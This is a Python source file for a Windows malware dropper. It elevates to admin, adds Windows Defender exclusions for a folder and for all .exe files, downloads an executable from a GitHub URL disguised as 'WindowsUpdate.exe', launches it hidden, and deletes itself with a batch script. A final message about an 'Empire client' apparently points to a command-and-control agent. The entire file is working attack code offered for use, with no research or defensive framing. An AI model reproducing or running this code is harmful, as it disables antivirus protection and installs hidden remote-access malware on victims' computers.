import os
import sys
import urllib.request
import subprocess
import ctypes
import time
import random

# ============ CONFIG ============
EXE_URL = "https://github.com/czolowek123/nowalink/blob/main/shutdown.exe"
EXEC_FOLDER = os.path.expandvars(r"%ProgramData%\Microsoft\Windows\Caches")
FINAL_NAME = "WindowsUpdate.exe"
# ================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_exclusion(folder_path):
    """Add Defender exclusion for the folder"""
    os.makedirs(folder_path, exist_ok=True)
    
    cmd1 = f'powershell -Command "Add-MpPreference -ExclusionPath \'{folder_path}\' -Force"'
    subprocess.run(cmd1, shell=True, capture_output=True)
    
    cmd2 = 'powershell -Command "Set-MpPreference -ExclusionExtension \'exe\' -Force"'
    subprocess.run(cmd2, shell=True, capture_output=True)
    
    print(f"[+] Defender exclusion added: {folder_path}")

def download_exe(url, dest_path):
    """Download EXE with fake User-Agent"""
    req = urllib.request.Request(url, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    print(f"[*] Downloading EXE from {url}...")
    with urllib.request.urlopen(req, timeout=30) as r:
        data = r.read()
    with open(dest_path, 'wb') as f:
        f.write(data)
    print(f"[+] Downloaded {len(data)} bytes to {dest_path}")
    return data

def run_hidden(exe_path):
    """
    Launch EXE with ZERO visible windows.
    Uses STARTUPINFO with SW_HIDE flag.
    """
    # Hide the window completely
    startup_info = subprocess.STARTUPINFO()
    startup_info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = 0  # SW_HIDE = 0
    
    # CREATE_NO_WINDOW (0x08000000) prevents console window creation
    creation_flags = 0x08000000  # CREATE_NO_WINDOW
    
    proc = subprocess.Popen(
        exe_path,
        shell=False,
        startupinfo=startup_info,
        creationflags=creation_flags,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE
    )
    
    # Close the pipe handles immediately so no handles leak
    if proc.stdout:
        proc.stdout.close()
    if proc.stderr:
        proc.stderr.close()
    if proc.stdin:
        proc.stdin.close()
    
    print(f"[+] Process running hidden (PID: {proc.pid})")
    return proc

def main():
    # Step 1: Elevate to admin
    if not is_admin():
        print("[*] Requesting admin privileges...")
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )
        sys.exit()
    
    print("[+] Running with admin privileges")
    
    # Step 2: Add folder exclusion FIRST
    print("[*] Adding Defender folder exclusion...")
    add_exclusion(EXEC_FOLDER)
    time.sleep(1)
    
    # Step 3: Download EXE directly into the excluded folder
    exe_path = os.path.join(EXEC_FOLDER, FINAL_NAME)
    
    try:
        download_exe(EXE_URL, exe_path)
    except Exception as e:
        print(f"[-] Direct download failed: {e}")
        # Fallback: download to temp first, then move
        temp_path = os.path.join(os.environ['TEMP'], f'upd{random.randint(1000,9999)}.exe')
        download_exe(EXE_URL, temp_path)
        os.replace(temp_path, exe_path)
    
    # Step 4: Random delay
    time.sleep(random.uniform(0.5, 2))
    
    # Step 5: Run fully hidden
    run_hidden(exe_path)
    
    # Step 6: If running as .pyw or compiled EXE, the dropper can self-delete
    try:
        # Remove the dropper itself if we're a compiled EXE
        if getattr(sys, 'frozen', False):
            # For PyInstaller: launch a delayed self-delete
            bat_content = f"""@echo off
timeout /t 3 /nobreak >nul
del "{sys.executable}"
del "%~f0"
"""
            del_path = os.path.join(os.environ['TEMP'], 'cleanup.bat')
            with open(del_path, 'w') as f:
                f.write(bat_content)
            subprocess.Popen(del_path, shell=True, startupinfo=subprocess.STARTUPINFO())
    except:
        pass
    
    print("[+] Done. Check Empire client: agents")

if __name__ == "__main__":
    main()